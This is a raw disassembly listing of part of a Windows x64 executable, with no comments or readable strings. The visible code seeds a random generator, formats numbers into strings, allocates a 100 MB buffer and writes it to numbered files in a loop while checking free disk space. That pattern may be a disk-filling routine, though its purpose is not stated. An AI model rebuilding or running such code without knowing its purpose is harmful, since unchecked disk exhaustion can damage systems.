   140002cf4:	48 8b cb             	mov    %rbx,%rcx
   140002cf7:	e8 64 3b 00 00       	call   0x140006860
   140002cfc:	90                   	nop
   140002cfd:	48 8d 4d a8          	lea    -0x58(%rbp),%rcx
   140002d01:	ff 15 59 55 00 00    	call   *0x5559(%rip)        # 0x140008260
   140002d07:	90                   	nop
   140002d08:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   140002d0c:	ff 15 4e 55 00 00    	call   *0x554e(%rip)        # 0x140008260
   140002d12:	90                   	nop
   140002d13:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002d18:	ff 15 42 55 00 00    	call   *0x5542(%rip)        # 0x140008260
   140002d1e:	85 f6                	test   %esi,%esi
   140002d20:	78 0d                	js     0x140002d2f
   140002d22:	48 8b 8d b8 00 00 00 	mov    0xb8(%rbp),%rcx
   140002d29:	48 8b 01             	mov    (%rcx),%rax
   140002d2c:	ff 50 10             	call   *0x10(%rax)
   140002d2f:	48 8b 4d 60          	mov    0x60(%rbp),%rcx
   140002d33:	48 8b 01             	mov    (%rcx),%rax
   140002d36:	ff 50 10             	call   *0x10(%rax)
   140002d39:	48 8b 4d 70          	mov    0x70(%rbp),%rcx
   140002d3d:	48 8b 01             	mov    (%rcx),%rax
   140002d40:	ff 50 10             	call   *0x10(%rax)
   140002d43:	48 8b 4d 68          	mov    0x68(%rbp),%rcx
   140002d47:	48 8b 01             	mov    (%rcx),%rax
   140002d4a:	ff 50 10             	call   *0x10(%rax)
   140002d4d:	ff 15 7d 58 00 00    	call   *0x587d(%rip)        # 0x1400085d0
   140002d53:	8b c6                	mov    %esi,%eax
   140002d55:	e9 cb f9 ff ff       	jmp    0x140002725
   140002d5a:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d5f:	e8 3c 39 00 00       	call   0x1400066a0
   140002d64:	90                   	nop
   140002d65:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d6a:	e8 31 39 00 00       	call   0x1400066a0
   140002d6f:	90                   	nop
   140002d70:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d75:	e8 26 39 00 00       	call   0x1400066a0
   140002d7a:	90                   	nop
   140002d7b:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d80:	e8 1b 39 00 00       	call   0x1400066a0
   140002d85:	90                   	nop
   140002d86:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d8b:	e8 10 39 00 00       	call   0x1400066a0
   140002d90:	90                   	nop
   140002d91:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002d96:	e8 05 39 00 00       	call   0x1400066a0
   140002d9b:	90                   	nop
   140002d9c:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002da1:	e8 fa 38 00 00       	call   0x1400066a0
   140002da6:	90                   	nop
   140002da7:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002dac:	e8 ef 38 00 00       	call   0x1400066a0
   140002db1:	cc                   	int3
   140002db2:	b9 0e 00 07 80       	mov    $0x8007000e,%ecx
   140002db7:	e8 e4 38 00 00       	call   0x1400066a0
   140002dbc:	cc                   	int3
   140002dbd:	cc                   	int3
   140002dbe:	cc                   	int3
   140002dbf:	cc                   	int3
   140002dc0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002dc5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140002dca:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002dcf:	55                   	push   %rbp
   140002dd0:	41 54                	push   %r12
   140002dd2:	41 55                	push   %r13
   140002dd4:	41 56                	push   %r14
   140002dd6:	41 57                	push   %r15
   140002dd8:	48 8d ac 24 70 ec ff 	lea    -0x1390(%rsp),%rbp
   140002ddf:	ff 
   140002de0:	b8 90 14 00 00       	mov    $0x1490,%eax
   140002de5:	e8 a6 3f 00 00       	call   0x140006d90
   140002dea:	48 2b e0             	sub    %rax,%rsp
   140002ded:	48 8b 05 4c a2 00 00 	mov    0xa24c(%rip),%rax        # 0x14000d040
   140002df4:	48 33 c4             	xor    %rsp,%rax
   140002df7:	48 89 85 80 13 00 00 	mov    %rax,0x1380(%rbp)
   140002dfe:	33 f6                	xor    %esi,%esi
   140002e00:	ff 15 ca 53 00 00    	call   *0x53ca(%rip)        # 0x1400081d0
   140002e06:	c7 85 74 13 00 00 ff 	movl   $0xffffffff,0x1374(%rbp)
   140002e0d:	ff ff ff 
   140002e10:	89 45 f4             	mov    %eax,-0xc(%rbp)
   140002e13:	ba 01 00 00 00       	mov    $0x1,%edx
   140002e18:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002e1f:	00 
   140002e20:	8b c8                	mov    %eax,%ecx
   140002e22:	c1 e9 1e             	shr    $0x1e,%ecx
   140002e25:	33 c8                	xor    %eax,%ecx
   140002e27:	69 c1 65 89 07 6c    	imul   $0x6c078965,%ecx,%eax
   140002e2d:	03 c2                	add    %edx,%eax
   140002e2f:	89 44 95 f4          	mov    %eax,-0xc(%rbp,%rdx,4)
   140002e33:	48 ff c2             	inc    %rdx
   140002e36:	48 81 fa 70 02 00 00 	cmp    $0x270,%rdx
   140002e3d:	72 e1                	jb     0x140002e20
   140002e3f:	c7 45 f0 70 02 00 00 	movl   $0x270,-0x10(%rbp)
   140002e46:	48 8d 1d bf 5d 00 00 	lea    0x5dbf(%rip),%rbx        # 0x140008c0c
   140002e4d:	4c 8d 35 ac 5d 00 00 	lea    0x5dac(%rip),%r14        # 0x140008c00
   140002e54:	48 8d 3d b5 5d 00 00 	lea    0x5db5(%rip),%rdi        # 0x140008c10
   140002e5b:	49 bc ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%r12
   140002e62:	ff ff 7f 
   140002e65:	41 bd 00 5e d0 b2    	mov    $0xb2d05e00,%r13d
   140002e6b:	49 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r15
   140002e72:	ff ff 7f 
   140002e75:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e79:	e8 32 36 00 00       	call   0x1400064b0
   140002e7e:	8b c8                	mov    %eax,%ecx
   140002e80:	48 69 c9 90 5f 01 00 	imul   $0x15f90,%rcx,%rcx
   140002e87:	81 f9 ef 2d 01 00    	cmp    $0x12def,%ecx
   140002e8d:	77 1b                	ja     0x140002eaa
   140002e8f:	90                   	nop
   140002e90:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002e94:	e8 17 36 00 00       	call   0x1400064b0
   140002e99:	8b c8                	mov    %eax,%ecx
   140002e9b:	48 69 c9 90 5f 01 00 	imul   $0x15f90,%rcx,%rcx
   140002ea2:	81 f9 f0 2d 01 00    	cmp    $0x12df0,%ecx
   140002ea8:	72 e6                	jb     0x140002e90
   140002eaa:	48 c1 e9 20          	shr    $0x20,%rcx
   140002eae:	81 e9 f0 d8 ff 7f    	sub    $0x7fffd8f0,%ecx
   140002eb4:	0f ba f9 1f          	btc    $0x1f,%ecx
   140002eb8:	4c 8d 4d e2          	lea    -0x1e(%rbp),%r9
   140002ebc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002ec0:	49 83 e9 02          	sub    $0x2,%r9
   140002ec4:	b8 cd cc cc cc       	mov    $0xcccccccd,%eax
   140002ec9:	f7 e1                	mul    %ecx
   140002ecb:	c1 ea 03             	shr    $0x3,%edx
   140002ece:	0f b7 c2             	movzwl %dx,%eax
   140002ed1:	66 c1 e0 02          	shl    $0x2,%ax
   140002ed5:	44 8d 04 10          	lea    (%rax,%rdx,1),%r8d
   140002ed9:	66 45 03 c0          	add    %r8w,%r8w
   140002edd:	66 41 2b c8          	sub    %r8w,%cx
   140002ee1:	66 83 c1 30          	add    $0x30,%cx
   140002ee5:	66 41 89 09          	mov    %cx,(%r9)
   140002ee9:	8b ca                	mov    %edx,%ecx
   140002eeb:	85 d2                	test   %edx,%edx
   140002eed:	75 d1                	jne    0x140002ec0
   140002eef:	4c 8d 45 e2          	lea    -0x1e(%rbp),%r8
   140002ef3:	49 8b d1             	mov    %r9,%rdx
   140002ef6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002efb:	e8 a0 2c 00 00       	call   0x140005ba0
   140002f00:	90                   	nop
   140002f01:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   140002f06:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140002f0b:	48 8b c1             	mov    %rcx,%rax
   140002f0e:	49 2b c0             	sub    %r8,%rax
   140002f11:	48 83 f8 06          	cmp    $0x6,%rax
   140002f15:	0f 82 93 00 00 00    	jb     0x140002fae
   140002f1b:	49 8d 40 06          	lea    0x6(%r8),%rax
   140002f1f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002f24:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140002f29:	48 83 f9 07          	cmp    $0x7,%rcx
   140002f2d:	48 0f 47 7c 24 30    	cmova  0x30(%rsp),%rdi
   140002f33:	48 3b df             	cmp    %rdi,%rbx
   140002f36:	76 1e                	jbe    0x140002f56
   140002f38:	4a 8d 04 47          	lea    (%rdi,%r8,2),%rax
   140002f3c:	4c 3b f0             	cmp    %rax,%r14
   140002f3f:	77 15                	ja     0x140002f56
   140002f41:	49 3b fe             	cmp    %r14,%rdi
   140002f44:	77 05                	ja     0x140002f4b
   140002f46:	48 8b de             	mov    %rsi,%rbx
   140002f49:	eb 10                	jmp    0x140002f5b
   140002f4b:	48 8b df             	mov    %rdi,%rbx
   140002f4e:	49 2b de             	sub    %r14,%rbx
   140002f51:	48 d1 fb             	sar    $1,%rbx
   140002f54:	eb 05                	jmp    0x140002f5b
   140002f56:	bb 06 00 00 00       	mov    $0x6,%ebx
   140002f5b:	4e 8d 04 45 02 00 00 	lea    0x2(,%r8,2),%r8
   140002f62:	00 
   140002f63:	48 8d 4f 0c          	lea    0xc(%rdi),%rcx
   140002f67:	48 8b d7             	mov    %rdi,%rdx
   140002f6a:	e8 92 48 00 00       	call   0x140007801
   140002f6f:	48 03 db             	add    %rbx,%rbx
   140002f72:	4c 8b c3             	mov    %rbx,%r8
   140002f75:	49 8b d6             	mov    %r14,%rdx
   140002f78:	48 8b cf             	mov    %rdi,%rcx
   140002f7b:	e8 7b 48 00 00       	call   0x1400077fb
   140002f80:	41 b8 0c 00 00 00    	mov    $0xc,%r8d
   140002f86:	4c 2b c3             	sub    %rbx,%r8
   140002f89:	49 8d 56 0c          	lea    0xc(%r14),%rdx
   140002f8d:	48 03 d3             	add    %rbx,%rdx
   140002f90:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   140002f94:	e8 62 48 00 00       	call   0x1400077fb
   140002f99:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140002f9e:	48 8d 1d 67 5c 00 00 	lea    0x5c67(%rip),%rbx        # 0x140008c0c
   140002fa5:	48 8d 3d 64 5c 00 00 	lea    0x5c64(%rip),%rdi        # 0x140008c10
   140002fac:	eb 18                	jmp    0x140002fc6
   140002fae:	48 c7 44 24 28 06 00 	movq   $0x6,0x28(%rsp)
   140002fb5:	00 00 
   140002fb7:	ba 06 00 00 00       	mov    $0x6,%edx
   140002fbc:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002fc1:	e8 3a 33 00 00       	call   0x140006300
   140002fc6:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002fc9:	0f 11 45 98          	movups %xmm0,-0x68(%rbp)
   140002fcd:	0f 57 c9             	xorps  %xmm1,%xmm1
   140002fd0:	f3 0f 7f 4d a8       	movdqu %xmm1,-0x58(%rbp)
   140002fd5:	0f 10 00             	movups (%rax),%xmm0
   140002fd8:	0f 11 45 98          	movups %xmm0,-0x68(%rbp)
   140002fdc:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002fe0:	0f 11 4d a8          	movups %xmm1,-0x58(%rbp)
   140002fe4:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140002fe8:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140002fef:	00 
   140002ff0:	66 89 30             	mov    %si,(%rax)
   140002ff3:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002ff8:	48 83 fa 07          	cmp    $0x7,%rdx
   140002ffc:	76 37                	jbe    0x140003035
   140002ffe:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003005:	00 
   140003006:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   14000300b:	48 8b c1             	mov    %rcx,%rax
   14000300e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003015:	72 19                	jb     0x140003030
   140003017:	48 83 c2 27          	add    $0x27,%rdx
   14000301b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000301f:	48 2b c1             	sub    %rcx,%rax
   140003022:	48 83 e8 08          	sub    $0x8,%rax
   140003026:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000302a:	0f 87 42 01 00 00    	ja     0x140003172
   140003030:	e8 2b 38 00 00       	call   0x140006860
   140003035:	89 74 24 70          	mov    %esi,0x70(%rsp)
   140003039:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000303c:	f3 0f 7f 44 24 78    	movdqu %xmm0,0x78(%rsp)
   140003042:	48 89 75 8c          	mov    %rsi,-0x74(%rbp)
   140003046:	89 75 94             	mov    %esi,-0x6c(%rbp)
   140003049:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   14000304d:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   140003052:	48 0f 47 45 98       	cmova  -0x68(%rbp),%rax
   140003057:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000305c:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140003061:	c7 44 24 74 01 00 00 	movl   $0x1,0x74(%rsp)
   140003068:	00 
   140003069:	c7 45 88 01 00 01 00 	movl   $0x10001,-0x78(%rbp)
   140003070:	45 33 c9             	xor    %r9d,%r9d
   140003073:	4c 8d 44 24 60       	lea    0x60(%rsp),%r8
   140003078:	ba 01 00 00 00       	mov    $0x1,%edx
   14000307d:	33 c9                	xor    %ecx,%ecx
   14000307f:	ff 15 c3 51 00 00    	call   *0x51c3(%rip)        # 0x140008248
   140003085:	85 c0                	test   %eax,%eax
   140003087:	75 76                	jne    0x1400030ff
   140003089:	48 8d 45 98          	lea    -0x68(%rbp),%rax
   14000308d:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   140003092:	48 0f 47 45 98       	cmova  -0x68(%rbp),%rax
   140003097:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   14000309c:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400030a3:	00 
   1400030a4:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1400030a9:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400030af:	48 8d 15 7a 5b 00 00 	lea    0x5b7a(%rip),%rdx        # 0x140008c30
   1400030b6:	33 c9                	xor    %ecx,%ecx
   1400030b8:	ff 15 82 51 00 00    	call   *0x5182(%rip)        # 0x140008240
   1400030be:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400030c1:	33 c0                	xor    %eax,%eax
   1400030c3:	0f 11 45 b8          	movups %xmm0,-0x48(%rbp)
   1400030c7:	0f 11 45 c8          	movups %xmm0,-0x38(%rbp)
   1400030cb:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   1400030cf:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   1400030d3:	c7 45 e0 01 00 01 00 	movl   $0x10001,-0x20(%rbp)
   1400030da:	48 8d 55 98          	lea    -0x68(%rbp),%rdx
   1400030de:	48 83 7d b0 07       	cmpq   $0x7,-0x50(%rbp)
   1400030e3:	48 0f 47 55 98       	cmova  -0x68(%rbp),%rdx
   1400030e8:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400030ed:	4c 8d 4d b8          	lea    -0x48(%rbp),%r9
   1400030f1:	33 c9                	xor    %ecx,%ecx
   1400030f3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400030f9:	ff 15 51 51 00 00    	call   *0x5151(%rip)        # 0x140008250
   1400030ff:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003104:	e8 17 df ff ff       	call   0x140001020
   140003109:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000310e:	49 3b c4             	cmp    %r12,%rax
   140003111:	7d 0b                	jge    0x14000311e
   140003113:	4a 8d 0c 28          	lea    (%rax,%r13,1),%rcx
   140003117:	48 89 4c 24 58       	mov    %rcx,0x58(%rsp)
   14000311c:	eb 05                	jmp    0x140003123
   14000311e:	4c 89 7c 24 58       	mov    %r15,0x58(%rsp)
   140003123:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003128:	e8 d3 2b 00 00       	call   0x140005d00
   14000312d:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
   140003131:	48 83 fa 07          	cmp    $0x7,%rdx
   140003135:	0f 86 3a fd ff ff    	jbe    0x140002e75
   14000313b:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140003142:	00 
   140003143:	48 8b 4d 98          	mov    -0x68(%rbp),%rcx
   140003147:	48 8b c1             	mov    %rcx,%rax
   14000314a:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003151:	72 15                	jb     0x140003168
   140003153:	48 83 c2 27          	add    $0x27,%rdx
   140003157:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000315b:	48 2b c1             	sub    %rcx,%rax
   14000315e:	48 83 e8 08          	sub    $0x8,%rax
   140003162:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003166:	77 20                	ja     0x140003188
   140003168:	e8 f3 36 00 00       	call   0x140006860
   14000316d:	e9 03 fd ff ff       	jmp    0x140002e75
   140003172:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003177:	45 33 c9             	xor    %r9d,%r9d
   14000317a:	45 33 c0             	xor    %r8d,%r8d
   14000317d:	33 d2                	xor    %edx,%edx
   14000317f:	33 c9                	xor    %ecx,%ecx
   140003181:	ff 15 81 53 00 00    	call   *0x5381(%rip)        # 0x140008508
   140003187:	cc                   	int3
   140003188:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000318d:	45 33 c9             	xor    %r9d,%r9d
   140003190:	45 33 c0             	xor    %r8d,%r8d
   140003193:	33 d2                	xor    %edx,%edx
   140003195:	33 c9                	xor    %ecx,%ecx
   140003197:	ff 15 6b 53 00 00    	call   *0x536b(%rip)        # 0x140008508
   14000319d:	cc                   	int3
   14000319e:	cc                   	int3
   14000319f:	cc                   	int3
   1400031a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400031a5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400031aa:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400031af:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   1400031b4:	55                   	push   %rbp
   1400031b5:	41 56                	push   %r14
   1400031b7:	41 57                	push   %r15
   1400031b9:	48 8d ac 24 70 fe ff 	lea    -0x190(%rsp),%rbp
   1400031c0:	ff 
   1400031c1:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   1400031c8:	48 8b 05 71 9e 00 00 	mov    0x9e71(%rip),%rax        # 0x14000d040
   1400031cf:	48 33 c4             	xor    %rsp,%rax
   1400031d2:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   1400031d9:	33 c0                	xor    %eax,%eax
   1400031db:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400031de:	f3 0f 7f 4c 24 30    	movdqu %xmm1,0x30(%rsp)
   1400031e4:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400031e9:	b9 27 00 40 06       	mov    $0x6400027,%ecx
   1400031ee:	e8 75 36 00 00       	call   0x140006868
   1400031f3:	48 85 c0             	test   %rax,%rax
   1400031f6:	0f 84 f2 03 00 00    	je     0x1400035ee
   1400031fc:	48 8d 58 27          	lea    0x27(%rax),%rbx
   140003200:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   140003204:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   140003208:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000320d:	48 8d b3 00 00 40 06 	lea    0x6400000(%rbx),%rsi
   140003214:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003219:	33 d2                	xor    %edx,%edx
   14000321b:	41 b8 00 00 40 06    	mov    $0x6400000,%r8d
   140003221:	48 8b cb             	mov    %rbx,%rcx
   140003224:	e8 a9 44 00 00       	call   0x1400076d2
   140003229:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000322e:	45 33 c9             	xor    %r9d,%r9d
   140003231:	4c 8d 05 08 5a 00 00 	lea    0x5a08(%rip),%r8        # 0x140008c40
   140003238:	48 8d 15 11 5a 00 00 	lea    0x5a11(%rip),%rdx        # 0x140008c50
   14000323f:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140003243:	e8 48 18 00 00       	call   0x140004a90
   140003248:	bf 01 00 00 00       	mov    $0x1,%edi
   14000324d:	33 d2                	xor    %edx,%edx
   14000324f:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   140003255:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000325a:	e8 73 44 00 00       	call   0x1400076d2
   14000325f:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   140003263:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003268:	e8 f3 19 00 00       	call   0x140004c60
   14000326d:	90                   	nop
   14000326e:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003273:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003277:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   14000327c:	48 03 c8             	add    %rax,%rcx
   14000327f:	ff 15 b3 4e 00 00    	call   *0x4eb3(%rip)        # 0x140008138
   140003285:	4c 8d 3d 8c 5b 00 00 	lea    0x5b8c(%rip),%r15        # 0x140008e18
   14000328c:	4c 8d 35 05 5b 00 00 	lea    0x5b05(%rip),%r14        # 0x140008d98
   140003293:	84 c0                	test   %al,%al
   140003295:	0f 85 7d 01 00 00    	jne    0x140003418
   14000329b:	49 bc cd cc cc cc cc 	movabs $0xcccccccccccccccd,%r12
   1400032a2:	cc cc cc 
   1400032a5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400032ac:	00 00 00 00 
   1400032b0:	41 b8 00 00 40 06    	mov    $0x6400000,%r8d
   1400032b6:	48 8b d3             	mov    %rbx,%rdx
   1400032b9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400032be:	ff 15 7c 4e 00 00    	call   *0x4e7c(%rip)        # 0x140008140
   1400032c4:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400032c9:	e8 c2 2d 00 00       	call   0x140006090
   1400032ce:	48 85 c0             	test   %rax,%rax
   1400032d1:	75 1f                	jne    0x1400032f2
   1400032d3:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400032d8:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400032dc:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   1400032e1:	48 03 c8             	add    %rax,%rcx
   1400032e4:	45 33 c0             	xor    %r8d,%r8d
   1400032e7:	ba 02 00 00 00       	mov    $0x2,%edx
   1400032ec:	ff 15 36 4f 00 00    	call   *0x4f36(%rip)        # 0x140008228
   1400032f2:	49 8b c4             	mov    %r12,%rax
   1400032f5:	48 f7 e7             	mul    %rdi
   1400032f8:	48 c1 ea 03          	shr    $0x3,%rdx
   1400032fc:	48 8d 0c 92          	lea    (%rdx,%rdx,4),%rcx
   140003300:	48 03 c9             	add    %rcx,%rcx
   140003303:	48 3b f9             	cmp    %rcx,%rdi
   140003306:	75 2d                	jne    0x140003335
   140003308:	45 33 c9             	xor    %r9d,%r9d
   14000330b:	45 33 c0             	xor    %r8d,%r8d
   14000330e:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   140003312:	48 8d 0d 43 59 00 00 	lea    0x5943(%rip),%rcx        # 0x140008c5c
   140003319:	ff 15 29 4d 00 00    	call   *0x4d29(%rip)        # 0x140008048
   14000331f:	85 c0                	test   %eax,%eax
   140003321:	0f 84 51 02 00 00    	je     0x140003578
   140003327:	48 81 7d 60 00 00 40 	cmpq   $0x6400000,0x60(%rbp)
   14000332e:	06 
   14000332f:	0f 82 cd 01 00 00    	jb     0x140003502
   140003335:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000333a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000333e:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003343:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003348:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000334c:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003352:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003356:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000335b:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140003360:	74 28                	je     0x14000338a
   140003362:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003366:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000336b:	48 39 08             	cmp    %rcx,(%rax)
   14000336e:	75 1a                	jne    0x14000338a
   140003370:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003374:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140003378:	48 89 08             	mov    %rcx,(%rax)
   14000337b:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000337f:	48 89 08             	mov    %rcx,(%rax)
   140003382:	2b d1                	sub    %ecx,%edx
   140003384:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   140003388:	89 10                	mov    %edx,(%rax)
   14000338a:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   14000338e:	74 0a                	je     0x14000339a
   140003390:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003395:	e8 f6 2c 00 00       	call   0x140006090
   14000339a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000339f:	ff 15 c3 4d 00 00    	call   *0x4dc3(%rip)        # 0x140008168
   1400033a5:	90                   	nop
   1400033a6:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400033ab:	ff 15 97 4d 00 00    	call   *0x4d97(%rip)        # 0x140008148
   1400033b1:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   1400033b5:	ff 15 b5 4d 00 00    	call   *0x4db5(%rip)        # 0x140008170
   1400033bb:	4c 8b cf             	mov    %rdi,%r9
   1400033be:	4c 8d 05 7b 58 00 00 	lea    0x587b(%rip),%r8        # 0x140008c40
   1400033c5:	48 8d 15 84 58 00 00 	lea    0x5884(%rip),%rdx        # 0x140008c50
   1400033cc:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   1400033d0:	e8 bb 16 00 00       	call   0x140004a90
   1400033d5:	48 ff c7             	inc    %rdi
   1400033d8:	33 d2                	xor    %edx,%edx
   1400033da:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   1400033e0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400033e5:	e8 e8 42 00 00       	call   0x1400076d2
   1400033ea:	48 8d 55 70          	lea    0x70(%rbp),%rdx
   1400033ee:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400033f3:	e8 68 18 00 00       	call   0x140004c60
   1400033f8:	90                   	nop
   1400033f9:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400033fe:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003402:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003407:	48 03 c8             	add    %rax,%rcx
   14000340a:	ff 15 28 4d 00 00    	call   *0x4d28(%rip)        # 0x140008138
   140003410:	84 c0                	test   %al,%al
   140003412:	0f 84 98 fe ff ff    	je     0x1400032b0
   140003418:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000341d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003421:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003426:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000342b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000342f:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003435:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003439:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000343e:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140003443:	74 28                	je     0x14000346d
   140003445:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003449:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   14000344e:	48 39 08             	cmp    %rcx,(%rax)
   140003451:	75 1a                	jne    0x14000346d
   140003453:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003457:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   14000345b:	48 89 08             	mov    %rcx,(%rax)
   14000345e:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140003462:	48 89 08             	mov    %rcx,(%rax)
   140003465:	2b d1                	sub    %ecx,%edx
   140003467:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   14000346b:	89 10                	mov    %edx,(%rax)
   14000346d:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   140003471:	74 0a                	je     0x14000347d
   140003473:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
